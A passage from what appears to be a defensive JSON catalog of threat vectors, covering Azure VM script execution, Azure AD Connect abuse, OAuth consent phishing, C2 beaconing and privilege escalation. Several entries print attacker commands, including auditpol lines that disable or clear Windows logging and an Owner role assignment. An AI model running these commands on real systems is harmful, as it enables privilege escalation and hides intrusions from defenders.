                "description": "This threat vector refers to adversaries running scripts or commands directly \non Azure virtual machines via built-in features, enabling malicious code execution \nand system compromise.\n\n## Example Attack Scenario\nAn attacker gains access to Azure portal credentials (via phishing or leaked secrets), \nallowing privilege escalation to interact with the management plane of Azure resources. \nThe attacker then uses features like **RunCommand**, **CustomScriptExtension**, \nor **Serial Console** to execute PowerShell or shell scripts directly on a targeted VM. \nFor instance, leveraging **CustomScriptExtension**, the intruder injects a script \nto dump credentials, establish persistence, or exfiltrate sensitive files\u2014all as SYSTEM user.\n\n## Attack Goals and Impact\n- The primary **goal** is to execute arbitrary commands with SYSTEM privileges, \nenabling full compromise of the VM and escalation to additional assets connected to the VM.\n- **Impact** includes:  - Data exfiltration (sensitive file theft, database dumps)  - Persistence (deploying webshells, creating new users)  - Lateral movement (pivoting from VM to network or cloud resources)  - Disruption (cryptomining, ransomware deployment)  - Evasion (disabling defenses on the VM level).\n\n## Attack Flow and Methodology\n1. The attacker identifies exposed or misconfigured Azure virtual machines, focusing   on accounts with management access.\n2. - The attacker uses management plane operations: for example, `Microsoft.Compute/virtualMachines/runCommand/action`,   `Microsoft.Compute/virtualMachines/extensions/write`, or serial console access.  - Executes malicious scripts (PowerShell, Bash) as SYSTEM.\n3. - Harvests credentials, establishes persistence, or launches further attacks.  - May leverage logging gaps to avoid detection, or clean up traces after execution.\n4. - Activity can be detected via auditing specific events such as `Microsoft.Compute/virtualMachines/extensions/write`   or anomalous use of VM scripting features.\n"
            },
            "c698fc79-3ed6-44a7-a9d7-bc447600e4c3": {
                "name": "Azure AD Connect abuse",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Azure Active Directory (Azure AD) Connect abuse represents a critical threat vector \nin hybrid identity environments, enabling attackers to pivot from on-premises Active \nDirectory to cloud environments. Below is a comprehensive analysis of the attack \nmethods, techniques, and implications based on current research.    \n\n### Attack Vectors \n\n**1. Credential Interception via MITM**  \nAttackers can perform man-in-the-middle (MITM) attacks against Azure AD Connect's \nPassword Hash Sync mechanism. By installing a rogue root CA certificate on the server \nand proxying traffic, they intercept Azure AD Connector credentials sent to `login.microsoftonline.com`. \nThis enables extraction of NT hashes for domain users.  \n\n**2. Server Compromise and Malicious Synchronization**  \nCompromising the Azure AD Connect server (e.g., via phishing or exploits) allows attackers to:  \n- Synchronize malicious objects (e.g., privileged user accounts) to Azure AD.  \n- Elevate privileges in the cloud environment, gaining access to sensitive data \nand configurations.    \n\n**3. Password Writeback Misconfiguration**  \nMisconfigured Password Writeback permissions (e.g., granting reset rights to privileged \non-premises accounts like Domain Admins) enables attackers to:  \n- Reset passwords of high-privilege accounts via Azure AD.  \n- Gain unauthorized access to on-premises resources (CVE-2017-8613).    \n\n**4. Pass-through Authentication (PTA) Abuse**  \nAttackers with access to the PTA agent server can:  \n- Use tools like **AADInternals** to intercept authentication requests.  \n- Register rogue PTA agents with compromised global admin credentials, harvesting \ncredentials during authentication.    \n\n**5. AZUREADSSOACC$ Account Exploitation**  \nThreat actors leverage the `AZUREADSSOACC$` account's NTLM hash to:  \n- Forge Kerberos tickets for synced users.  \n- Pivot to Azure AD, especially when synced Global Administrator accounts exist and \nMFA is lax.    \n\n**6. MSOL Account Abuse**  \nThe 'MSOL_[hash]' service account (used by Azure AD Connect) is a high-value target because it:  \n- Has extensive on-premises and cloud permissions (e.g., password reset, DCSync capabilities).  \n- Can reset passwords of synced admin accounts, leading to cloud and on-premises compromise. \n"
            },
            "c7e260d8-d391-41eb-be1a-7f276c99b383": {
                "name": "Azure app registration - privilege escalation",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Azure app registration privilege escalation is a significant threat vector where \nattackers exploit misconfigured or compromised application registrations to gain \nelevated access in Azure environments. This occurs when attackers leverage excessive \npermissions associated with service principals or app registrations to bypass role-based \naccess controls (RBAC).\n\n### Key Attack Vectors  \n**1. Service Principal Ownership Abuse**  \nOwners of Azure applications can modify service principal permissions. For example, \na user with **Reader** role but ownership of an application could execute commands like:  \n```bash\naz role assignment create --assignee \"[email\u00a0protected]\" --role \"Owner\" --scope \"/subscriptions/Production\"\n```\nThis grants **Owner** privileges, enabling resource creation/deletion and further \nrole assignments.  \n\n**2. Dangerous API Permissions**  \nApp registrations with high-privilege Microsoft Graph API permissions pose critical risks:  \n- **AppRoleAssignment.ReadWrite.All**: Allows granting admin consent and assigning \nroles like **RoleManagement.ReadWrite.Directory** (enables Global Admin escalation).  \n- **Directory.ReadWrite.All**: Permits modifying Azure AD group memberships.  \n- **User.ReadWrite.All**: Enables password resets and profile modifications.  \n\n**3. Phishing-Driven Attacks**  \nAttackers with a compromised standard user account can:  \n1. Register an app with \"Accounts in any organizational directory\" and phishing redirect URIs.  \n2. Configure high-risk Graph API permissions (e.g., *Mail.Read*, *User.Read.All*).  \n3. Send phishing links to victims, capturing access tokens via a malicious OAuth server.  \n\n### Exploitation Workflow  \n- **Step 1**: Compromise a low-privileged account.  \n- **Step 2**: Create or modify an app registration to include dangerous permissions.  \n- **Step 3**: Use the app\u2019s client ID/secret to authenticate and execute privileged \noperations (e.g., adding users to admin groups).  \n- **Step 4**: Escalate to **Global Admin** via *RoleManagement.ReadWrite.Directory*.  \n"
            },
            "490a5d5d-5880-45bd-a05d-176878e0ae24": {
                "name": "Azure DevOps pipelines",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Azure DevOps pipelines are a critical component in modern software development but \nalso present significant attack surfaces for threat actors. Key threats include \nsupply chain compromises, insider attacks, privilege escalation vulnerabilities, \nand misconfigurations that can lead to unauthorized access, data breaches, and malicious \ncode execution.\n\n## Comprehensive Threat Vectors for Azure DevOps Pipelines\n\n### Supply Chain Attacks\n- **Malicious Extensions and Tasks:** Attackers may upload harmful extensions to \nthe Azure DevOps Marketplace, which can execute arbitrary code if installed and \nrun in pipelines.\n- **Compromised Build Agents:** Outdated or unpatched build agents can be exploited \nto gain persistent access or execute malicious code within pipelines.\n- **Dependency Poisoning:** Malicious code can be injected into package dependencies \n(e.g., NuGet, npm, Maven), which are then pulled and executed during pipeline builds.\n- **Third-Party Tool Integrations:** Compromised integrations or plugins can introduce \nvulnerabilities into the pipeline execution environment.\n\n### Insider Threats\n- **Unauthorized Pipeline Modifications:** Users with access can alter pipeline \nYAML files or scripts to introduce malicious code, especially if branch protections \nare weak or absent.\n- **Token Abuse:** Attackers can abuse pipeline job tokens (e.g., swapping short-term \nfor persistent tokens via vulnerabilities like CVE-2025-29813) to escalate privileges \nor access sensitive resources.\n- **Malicious Code Injection:** Insiders might inject malicious scripts or commands \nduring pipeline runs, potentially bypassing code reviews if pull requests are not \nenforced.\n\n### Credential and Secret Exposure\n- **Hardcoded Secrets:** Storing API keys, passwords, or tokens directly in pipeline \nscripts or configuration files can lead to exposure if logs are not properly secured.\n- **Leaked Logs:** Pipeline logs may inadvertently contain sensitive information \nif proper masking and filtering are not enforced.\n- **Forked Repositories:** Secrets in pipelines can be exposed if pipelines run \non forked repositories, especially if pull requests are not properly secured.\n- **Insufficient Secret Rotation:** Failing to regularly rotate secrets increases \nthe risk of exploitation if credentials are compromised.\n\n### Network and Access Control Weaknesses\n- **Unrestricted Network Access:** Lack of IP allowlisting or network security groups \n(NSGs) can allow attackers to access pipeline resources from untrusted locations.\n- **Weak Authentication:** Using personal access tokens (PATs) instead of OAuth \nor managed identities can increase the risk of credential theft.\n- **Insufficient Role-Based Access Control (RBAC):** Overprivileged users or service \naccounts can lead to unauthorized actions or data exfiltration.\n- **Lack of Isolation:** Pipelines not isolated from each other or from sensitive \nresources can enable lateral movement within the environment.\n"
            },
            "5e6af460-db12-4278-b44d-7a7a3fa7fe76": {
                "name": "BRICKSTORM file manager exposes end-user's HTTP APIs and UI",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "One of the observed China-nexus cluster achieves their goals with\nthe involvement and the usage of previously unknown vulnerabilities\n(a.k.a., zero-days) alongside with low-noise backdoors like `BRICKSTORM`\nfamily.\n\nThe unauthorised access provided by `BRICKSTORM` grants attackers the\nability to execute file management and network tunneling functions\ncrucial for espionage. These capabilities enable them to browse file\nsystems, create or delete files and directories, and establish network\nconnections to facilitate lateral movement within the compromised\nenvironment. Unlike many other forms of malware that create noticeable\ndisruptions, BRICKSTORM's operations are meticulously crafted to avoid\ndetection, maintaining a consistent and clandestine presence within\nthe target network ref [3]. \n\nRecently identified `BRICKSTORM` executables provide threat actors\nwith a file manager named `BRICKSTORM file manager`.   \n\nThe `BRICKSTORM file manager` exposes an HTTP API and rudimentary UI\n(User Interface) encapsulated within the protocol. The backdoor's\nJSON-based API provides a wide range of file-related actions such\nas uploading, downloading, renaming, and deleting files.\n\nAdversaries can further-more create or delete directories as well\nas list their contents. The BRICKSTORM panel is served by the malware\nitself and proxied through its protocol towards a Command & Control\nserver. Further this functionality and specific behavior allows the\nadversary to select a drive they wish to browse. Once the drive is\nselected, BRICKSTORM allows the adversaries to browse through the\nfile system and download files by their choice ref [1].  \n"
            },
            "7b122bb4-fc13-438b-a052-4388c501ec59": {
                "name": "C2 beaconing on specific time intervals",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "C2 beaconing refers to the periodic communication between a compromised\nsystem and a Command and Control (C2) server. The packets are sent from the\ninfected host to the C2 server at regular intervals, known as the `beacon\ninterval`, which can be down to the second to avoid suspicion. For example,\na Cobalt Strike beacon might have an average sleep of several seconds with\njitter added to disrupt the pattern. The compromised system, often is\nreferred as a \"beacon\" sends periodic signals or \"beacons\" to the C2 for\none of the following reasons ref [1].\n\n- Check for new commands or updates\n- Report back on its status or activities\n- Receive instructions or configuration changes\n- C2 beaconing on specific time intervals\n\nTo avoid detection, attackers often configure the compromised system to\nbeacon on specific time intervals.\n\n### Possible C2 beaconing set-up\n\nA threat actor can set C2 server to respond in one of the following ways.\n\n- Fixed intervals: The beacon sends signals at fixed intervals, e.g., every  5 minutes, 1 hour, or 24 hours.\n- Randomised intervals: The beacon sends signals at randomised intervals,  e.g., between 5-15 minutes, to make it harder to detect.\n- Scheduled intervals: The beacon sends signals at specific times, e.g.,  during business hours or when the system is most active.\n\n### Threat actor's purposes\n\nAttackers can set a specific timing or rules in their Command and Control\nservers depends on different reasons and goals.\n\n- Evade detection: By beaconing at regular intervals, the attacker can avoid  detection by security systems that rely on anomaly detection or behavioral  analysis.\n- Maintain stealth: By using fixed or randomized intervals, the attacker can  make it harder for security teams to detect the beaconing activity.\n- Conserve resources: By only communicating at specific intervals, the  attacker can conserve resources, such as bandwidth and system resources,  on the compromised system.  \n"
            },
            "ddab407e-d09d-4804-a4af-c11213553146": {
                "name": "C2 domains point to non-routable IP addresses",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "The attackers may configure their own C2 domain to point to a non-internet\nroutable address, localhost (127.0.0.1) or RFC1918 (private) IP addresses [1]. \nBy doing so, the underlying IP C2 infrastructure remains hidden, allowing\nthe threat actor to remain undetected for longer period of time until they\ndecide to engage infected hosts by changing the DNS A record to point the\nactual C2 server.\n\nOne of the top threat actor groups is observed to use multiple malicious\ndomains which are resolving to non-routable addresses (like `127.0.0.1`).\nDuring inactive periods of time, the goal of this technique is to mask the\nlocation of the Command and Control server. Analysis indicates attacks\npredominantly occur during night hours in China, originating likely from\nNorth America, and are precisely timed to avoid detection ref [2], [3].     \n\nEvasion of detection - when a threat actor uses this technique, they could \nevade detection by traditional network security monitoring tools and rules, \nwhich typically focus on outgoing (victim network -> internet) traffic.\n\nAvoiding C2 Indicator of Compromise (IoC) detections - when the threat actor \nhas a suspicion of being detected or the C2 IP has been exposed, they may \nchange the C2 domain DNS record to a non-routable one while setting up new \ninfrastructure.\n"
            },
            "682bf600-ec3e-4780-9f8f-8305ac602bef": {
                "name": "Change file owner to a privileged account",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Adversaries seeking to gain or maintain elevated privileges often target the \nownership and permissions of critical files or directories. By changing a \nfile\u2019s owner to a privileged account (e.g., SYSTEM on Windows, `root` on Linux, \nor `root:wheel` on macOS), threat actors ensure that their malicious tools, \nbinaries, or configuration files inherit elevated trust levels. \nThis manipulation can facilitate various malicious objectives, including \nexecuting code with higher privileges, bypassing security controls, \nand evading detection.  \n\n### Windows\n\nAttackers may use built-in utilities such as `takeown.exe` or `icacls.exe` \nto change ownership and grant Full Control permissions to a high-privilege \nuser or group.  \n\nFor instance:  \n```powershell\ntakeown.exe /f C:\\sensitive_data.txt\nicacls.exe C:\\sensitive_data.txt /setowner Administrator\nicacls.exe C:\\sensitive_data.txt /grant Administrator:F\n```\n\nBy doing so, they can ensure that subsequent manipulations of these files, \nincluding the addition of backdoors, data exfiltration tools, \nor credential-stealing binaries, are executed under a privileged context.  \n\n### Linux and macOS\n\nThreat actors mainly rely on the `chown` command to modify file ownership. \nBut other commands may achieve the same objective like chgrp or setfacl \n\nFor example:\n```bash\nsudo chown root:root /usr/local/bin/malicious_script\n```\n\nOnce a file is owned by `root`, it can be paired with setuid bits \nor extended attributes, enabling the file to run with elevated privileges. \n"
            },
            "36694031-a3d8-474e-b0e6-f44ba94c2a22": {
                "name": "Change the audit policy to disable Windows event logging",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "A threat actor may change an audit policy setting with the purpose of\ndisabling Event logging for specific entries. Usually the threat actor will\ndisable specific audit policy entries, but other scenarios can be imagined.\n\nFor example, they can change the audit policy settings manually, with\nPowerShell or other scripts, through the registries or by using\nCommand-line interface.\n\nExamples: \n\nCommand-prompt (cmd) interface:\n\nauditpol /set /category:\"Account Logon\" /success:disable /failure:disable\n\nWhere /success or /failure are parameters used for disabling of successful\nor failed events.\n\nauditpol /Set /Category:* /success:disable\n\nWhere the parameter /Category is used to delete only specific category, set of\ncategories or all of them as shown in the example with wildcard (*) character.\n\nauditpol /clear /y\nauditpol /remove /allusers\n\nThe both commands are used to clear the audit policy settings\n\nPowerShell commands to modify Audit policies:\n\nauditpol /get /category:*\nor auditpol /list/category\nPS ~> $AuditPolicyReader::GetClassicAuditPolicy()\n\nExample for a PowerShell script that change the audit policy to audit\nsuccessful logon events on the local computer. A threat actor can modify\nthe $GPO and $SecuritySettingsPath variables to target a different GPO or\nsecurity setting, also can modify $AuditSettingName and $AuditSettingValue\nvariables to change the audit policy to a different setting or value.\n\nImport-Module GroupPolicy\n$GPO = \"LocalGPO\"\n$SecuritySettingsPath = \"Computer Configuration\\Windows Settings\\Security Settings\"\n$AuditSettingName = \"Audit Logon Events\"\n\n# Set the value for the security setting.\n# The values are:\n# 0 = Success and Failure\n# 1 = Success\n# 2 = Failure\n\n$AuditSettingValue = 1\n$SecuritySettings = Get-GPRegistryValue -Name $GPO -Key $SecuritySettingsPath | Select-Object -ExpandProperty Values\n$AuditSetting = $SecuritySettings | Where-Object { $_.Name -eq $AuditSettingName }\n$AuditSetting.Value = $AuditSettingValue\nSet-GPRegistryValue -Name $GPO -Key $SecuritySettingsPath -Value $SecuritySettings\ngpupdate /force\n\n\nFor advanced policies, threat actors can use /r to get a csv-formatted table:\n\nauditpol /get /category:'Account Logon' /r | ConvertFrom-Csv | \nFormat-Table 'Policy Target',Subcategory,'Inclusion Setting'\n\nManual change: \n\nIf the service secpol.msc is running, then a threat actor can navigate to\nSecurity Settings\\Local Policies\\Audit Policy to modify the basic policy\nsettings or navigate to Security Settings\\Advanced Audit Policy\nConfiguration to modify advanced policy settings.\n"
            },
            "60c5b065-7d06-4697-850f-c2f80765f10b": {
                "name": "Changes to Azure infrastructure deployed through Azure CLI",
                "model": true,
                "tlp": "clear",
                "criticality": "Baseline - Negligible",
                "description": "A threat actor in control of the prerequisites may attempt to use the Azure\nCLI to perform changes either to the endpoint from which the CLI is \naccessed or on remote infrastructure, user accounts, service principals, \nor configurations. \n\nA threat actor can only perform changes that are allowed in the scopes of\ncredentials, temporary credentials, or service principals that the threat \nactor has control of, barring usage of a vulnerability in Azure to allow\nmore than that.\n"
            },
            "4ac2b666-736a-42c5-9548-50393ea6bc46": {
                "name": "Cloning private repositories",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "A threat actor can clone legit repositories, embed malicious code\nbut make them looks like legit. Their purpose is to entice a developer\nto download and use the decoy repositories.    \n\nUnauthorized cloning of private repositories is a form of IP theft.\nAdversaries from external hackers to insiders aim to steal source code,\nconfiguration details and secrets. The stolen information can be used\nin multiple ways such as competitive advantage, discover vulnerabilities,\ncompromise other systems or mimic the original repositories to trick\ndevelopers into their rogue repository.  \n\nAfter cloning of the repository, as a next step, the threat actor\nspreads public available links from where a developer downloads its\nmalicious content.  \n\nThe threat actors employ various techniques to clone public or private\nrepositories, often with malicious intent. Some of the methods for\nrepository cloning include:  \n\n### Misconfigured GitHub repositories\n\nThreat actors exploit misconfigurations in GitHub, Gitlab or similar\nrepositories. They search for repositories with sensitive information\n(such as API keys, credentials, or proprietary code) that have been\naccidentally exposed. Once they find such repositories, they clone\nthem to their own accounts or local systems. By doing so, they gain\naccess to the codebase and any sensitive data within it ref [4].          \n\n### Automated cloning and credential harvesting\n\nIn some cases, threat actors use automated tools to clone public\nrepositories. They specifically target repositories containing\nIdentity and Access Management (IAM) credentials. By cloning these\nrepositories, they harvest sensitive credentials, which can later\nbe used for unauthorized access, example in ref [5].            \n\n### Repo confusion scheme\n\nThis scheme involves cloning existing repositories, Trojanizing them\n(adding malicious code), and re-uploading them. The attackers hope that\nthe developers will mistakenly download the infected version.      \n\nOnce a threat actor has access to a CI pipeline, they obtain access key\nor tokens to the SCM-Manager (ref [6]) and can perform action or operation\nallowed for those credentials such as cloning private repository. This may\nlead to unauthorized access to sensitive information and/or intellectual\nproperty theft. Threat actors may identify weaknesses in the code and later\nexploit them.      \n\nA common command used for repositories cloning is:\n\ngit clone git://github.com/username/reponame.git\n\n### Injection of a malicious code directly into exposed libraries\n\nSome of the threat actor groups are observed to inject malicious code\ndirectly into exposed libraries or submit fraudulent pull requests.\nThis technique can be used in a combination with repository cloning\nto convey a malicious payload and infect developer systems and pilfer\nsensitive files further ref [7].    \n"
            },
            "f1dc4341-eb45-4d07-8075-b1a6b227cc76": {
                "name": "Cloud IAM role assumption",
                "model": true,
                "tlp": "clear",
                "criticality": "Severe",
                "description": "Once adversaries gained a set of creentials, they will\ntry to discover and leverage identity policies to increase their\ncontrol over the infrastructure. This is especially the case for\ninstance credentials, which can be stolen through exploitation.\n\nChanging roles will allow the adversary to assume a\nmore powerful role, escalate privileges and eventually move further\nin the cloud to achieve objectives. This can be particularly\nimpactful if cross account roles are leveraged."
            },
            "61ddc240-e5a6-4ca8-ae77-6b471b498913": {
                "name": "Code execution via custom script extensions in Azure",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "The Azure Custom Script Extension (CSE) is designed to automate post-deployment \ntasks on virtual machines (VMs) by downloading and executing scripts provided by \nusers. While this is intended for legitimate configuration and management, it introduces \na powerful threat vector: attackers with sufficient Azure permissions can leverage \nCSE to execute arbitrary code as SYSTEM (Windows) or root (Linux) on any accessible VM.\n\n### How Attackers Exploit This Vector\n\n- **Privilege Abuse**: If an attacker compromises an account with the *Virtual Machine \nContributor* role or any role that grants `Microsoft.Compute/virtualMachines/extensions/write` \npermissions, they can deploy or update custom script extensions on target VMs.\n- **Arbitrary Code Execution**: The attacker can specify any script (PowerShell, Bash, etc.) \nto be downloaded from a remote location (such as a malicious website or public repository) \nand executed with the highest local privileges on the VM.\n- **Bypassing Network Controls**: Because CSE operates through the Azure control \nplane, it does not require direct network access to the VM. Scripts can be executed \neven if RDP or SSH ports are closed, bypassing traditional network-based restrictions.\n- **Persistence and Lateral Movement**: Attackers can use CSE to establish persistence \n(e.g., by installing backdoors), harvest credentials, or pivot to other resources \nwithin the environment.\n- **Stealth**: Since CSE operations are part of normal Azure VM management workflows, \nmalicious activity may blend in with legitimate administrative actions.\n\n### Example Attack Scenario\n- An attacker uploads a malicious script to a public storage location.\n- Using compromised credentials with the necessary Azure permissions, the attacker \nconfigures the CSE on a target VM to download and execute the script.\n- The script runs as SYSTEM/root, granting full control over the VM, and can perform \nactions such as installing malware, mining cryptocurrency, exfiltrating data, or \ncreating new privileged accounts.\n\n### Real-World Impact\n- **Observed Cases**: There have been documented incidents where attackers used \nthe CSE to deploy cryptocurrency miners across multiple customer environments by \nreferencing a malicious script hosted on a public GitHub repository.\n- **Scope of Access**: This technique is not limited to individual VMs; it can be \nused on VM scale sets and Azure ARC-managed resources, amplifying the potential impact.\n- **No Network Barriers**: The attack is effective regardless of the VM\u2019s network \nsecurity group settings or firewall rules, as it leverages the Azure management plane.\n"
            },
            "b954303c-0ad0-4dc0-b5ca-492c3de9cd53": {
                "name": "Collecting sensitive information via custom script extensions",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Custom Script Extensions in Azure are powerful automation tools for configuring \nand managing Virtual Machines (VMs). However, attackers can exploit these extensions \nto collect sensitive information in a variety of ways.\n\n## Credential Harvesting\n- **Stored Credentials:** Attackers deploy scripts that search for credentials stored \nin plaintext files, configuration files, or environment variables.\n- **Credential Managers:** Scripts can target credential managers or vaults such \nas Azure Key Vault, Windows Credential Manager, or third-party vaults to extract \nstored credentials.\n\n## Configuration Files and Secrets\n- **Configuration Files:** Scripts can systematically search for and exfiltrate \nconfiguration files containing sensitive data like database connection strings, \nAPI keys, or other secrets.\n- **Environment Variables:** Attackers can extract environment variables that hold \nsensitive configuration or authentication information.\n\n## Log Files and Audit Trails\n- **Log Files:** Scripts can access and exfiltrate log files that may contain sensitive \ninformation, such as authentication logs, database logs, or application logs.\n- **Audit Trails:** Attackers can collect and exfiltrate audit trails that record \nadministrative actions or other sensitive activities.\n\n## Memory Scraping\n- **Running Processes:** Scripts can be designed to scrape memory from running processes \nto extract sensitive information like session tokens, encryption keys, or other \nin-memory data.\n- **DLL Injection:** Attackers can use DLL injection techniques within scripts to \nextract sensitive data from running processes.\n\n## Network Traffic Interception\n- **Network Sniffing:** Scripts can enable network sniffing tools to capture sensitive \ninformation transmitted over the network.\n- **Proxy Servers:** Attackers can configure proxy servers via scripts to intercept \nand log network traffic, capturing sensitive data in transit.\n\n## Exploitation of Vulnerabilities\n- **Unpatched Software:** Attackers can exploit vulnerabilities in unpatched software \nto gain elevated privileges and execute scripts that collect sensitive information.\n- **Misconfigurations:** Misconfigurations in the VM or the environment can be exploited \nto deploy and run malicious scripts.\n\n## Data Exfiltration Channels\n- **External Storage:** Scripts can exfiltrate collected data to external storage \nsolutions such as Azure Blob Storage, external servers, or other cloud storage services.\n- **Email Exfiltration:** Attackers can use scripts to send sensitive information \nvia email to an external address.\n- **Command and Control (C2) Servers:** Scripts can communicate with C2 servers \nto exfiltrate data and receive further instructions.\n\n## Persistent Data Collection\n- **Scheduled Tasks:** Attackers can create scheduled tasks or services that periodically \nexecute scripts to collect and exfiltrate sensitive information over time.\n- **Backdoor Scripts:** Scripts can be designed to act as backdoors, allowing attackers \nto execute commands and collect data as needed.\n"
            },
            "4b1c47ee-f45a-4b89-98e7-e943bcd5dd19": {
                "name": "Command injection on web components of Ivanti Connect Secure appliances",
                "model": true,
                "tlp": "clear",
                "criticality": "Severe",
                "description": "Attackers may manage to inject commands to an Ivanti Connect Secure \nappliance (that provide remote VPN access to corporate \ninfrastructures) either with valid credentials for vulnerable \nauthenticated endpoints or exploiting a vulnerability to bypass \nauthentication.  \n\nThese vulnerabilities are identified as CVE-2024-21888 and \nCVE-2024-21893. CVE-2024-21893 have been exploited in the wild chained \nwith CVE-2024-21887 and can lead to remote adversaries to execute \narbitrary commands on targeted gateways.\n\nIn addition to the list of LOLbins see [3], following commands were \nused in the ICS attack is the following:\n- aria2c\n- at\n- cat \n- check_ssl_cert\n- crash\n- crontab\n- echo\n- mount\n- nohup\n- pidstat\n- sed\n- split\n- sysctl\n- tcpdump\n- wireshark\n- tshark\n"
            },
            "1c1c9665-a30e-479b-bd80-1afb7b53ac83": {
                "name": "Compromised software packages",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Compromised software packages in a supply chain attack refer to the\nintentional or unintentional inclusion of malicious code or vulnerabilities\nin software components, libraries, or dependencies that are used by multiple\norganizations or products. This type of attack targets the software supply\nchain, which includes all the organizations, people, and processes involved\nin designing, developing, testing, building, delivering, and maintaining\nsoftware.\n\n### Types of compromised software packages\n\n- Malicious libraries or dependencies: Open-source or third-party libraries\nthat contain malicious code, which can be used to steal sensitive data,\ndisrupt operations, or create backdoors.\n- Tampered software updates: Legitimate software updates that have been\ncompromised by an attacker, allowing them to inject malware or backdoors\ninto the updated software.\n- Infected software components: Software components, such as DLLs or\nexecutables, that contain malware or vulnerabilities, which can be\nused to compromise the entire system.\n- Fake or counterfeit software: Software that is intentionally designed\nto mimic legitimate software, but contains malware or vulnerabilities.\n- Typosquatting attacks: This type of approach includes a small changes\nin the name of the software packages. In this way is very difficult to\nrecognise a malicious from a legitimate software package for installation.\nThe packages with names similar to legitimate ones could be deceiving and\neasily lure the victim to download and use them. \n\n### Dependency poisoning \n\nThreat actors can add intentional vulnerabilities to open-source libraries\nby exploiting their accessibility. Such example is typosquatting attacks\nin which an adversary uploads malicious packages with names similar to\npopular NPM or PyPI libraries to trick developers into downloading\nthe wrong one. Threat actors can also inject malicious code into trusted\nlibraries,for example: Log4j, NPM, or PyPI, compromising thousands of\napplications that rely on them. This type of attack, often referred\nto as \u201csupply chain poisoning,\u201d can have a massive impactful\nconsequences. ref [2].  \n\nIt's recommended a security officer to establish robust policies for\nevaluating, approving, and managing open-source libraries. This includes\nselecting packages from trusted sources and monitoring their activity."
            },
            "518ff777-f10d-4201-9e54-2779c31c512e": {
                "name": "Consent phishing attack",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "In consent phishing, attackers create a phishing scheme, such as emailing a user with a\nlink to a required password update. If the user clicks the link, they are redirected to\na Microsoft 365 permission request. It may include this language:\n\n\u201cThis app would like to  Read your contacts  Read and write access to your mail  Send mail as you  Sign you in and read your profile\u201d\n\nIf the user consents to the permission request, the third-party app, controlled by the\nattacker, will have high-level access to their account. The attacker can then use the \naccount without actually having credential access or MFA codes.\n\n\n## How the attack works\n\nThere are two components for a successful consent phishing attack, the OAuth 2.0\nauthorization protocol and social engineering.\n\nOAuth 2.0 providers are used to allow applications to access a user's resources \nwithout needing passwords. If a user wants to use a new application, they may be \npresented with an option to sign up using their Google account, for example.\nIf they choose this option, Google will send an authorization code which will \nshare the information needed to create an account.\n\nAttackers exploit this permission step. They can register a malicious app with\nan OAuth 2.0 provider to trick users into thinking it is a legitimate and trusted\nsource. Below are the steps typically seen while deploying a malicious OAuth app:\n\n- Register a new single tenant application with the naming convention of  [domain name]_([a-zA-Z]){3} (for example: Contoso_GhY)\n- Add the legacy permission Exchange.ManageAsApp which can be used for app-only  authentication of Exchange Online PowerShell module\n- Grant admin consent to the above permission\n- Give global admin and Exchange Online admin roles to the previously   registered application\n- Add application credentials (key/certificate/both)  \n\n\nSocial engineering is also an important part of a consent phishing attack. \nConsent phishing emails are typically well crafted: the email is branded with a\nspoof but legitimate-sounding business company, and the malicious link looks real\nbecause the app had been properly registered with an OAuth 2.0 provider.\n\nThe legitimate components within a consent phishing campaign make it more dangerous.\nEven the use of security measures such as MFA is no match for consent phishing.\nThe attack happens after the credentials have been entered and then acts\npost-authentication to carry out persistent access to user data.\n\nThe consent phishing email also tricked users by playing on a sense of urgency \nand concern to review and sign an important business document. Here is what a\nconsent phishing attempt usually looks like:\n\n- The attacker registers a malicious app with an OAuth 2.0 provider (eg. Azure AD).\n- The app carries a reliable name and structure not to raise suspicion.\n- The attacker sends a phishing email with a link to a user, asking to grant  permission to the malicious app.\n- The user clicks on the OAuth 2.0 URL which generates an authentic permission request.\n- The user grants access to a malicious app, and an authorization code is sent  to the attacker.\n- The authorization code is redeemed for access tokens which an attacker uses  to gain access to user data.\n\nOnce the user accepts the message, their data becomes accessible to the attacker.\nThis can include email, contacts, forwarding rules, files, notes, profile, etc.\n"
            },
            "025c73c6-f1a6-4382-a64f-38cfe81f8dc6": {
                "name": "Container privilege escalation via kernel or container runtime exploit",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Vulnerabilities in container runtime (Docker, containerd, etc.) or kernel \n(Linux or Windows) can be exploited by a threat actor with execution \nability to jump out from container to host system and gain \nroot/administrator privileges depending on vulnerability type. \n"
            },
            "79357f02-6868-4bf5-9f21-1cfd6ab03056": {
                "name": "CrackMapExec (CME) on endpoints or being downloaded",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "CrackMapExec is a post-compromise tool that contains a number of\nmodules and functionalities that allow red teams, pentesters and\nthreat actors to perform post-compromise actions. Detecting\nboth the presence of the tool itself, plus the usage of the tool\nis an important baseline security detection.\n"
            },
            "54adba8e-e3f8-43e2-bcd5-7c3cd61112d9": {
                "name": "Create a process with a token",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Adversaries may create a new process with a different token \nto escalate privileges and bypass access controls. A processes \ncan be created with the token and resulting security context \nof another user using features such as CreateProcessWithTokenW \nand runas.\n\nAn adversary creates a new access token with DuplicateToken(Ex) \nand uses it with CreateProcessWithTokenW to create a new process \nrunning under the security context of the impersonated user. \nThis is useful for creating a new process under the security \ncontext of a different user.\n"
            },
            "94b7287b-ae84-4b89-8093-63898c7475c9": {
                "name": "Credential file download to compromised Windows endpoint",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
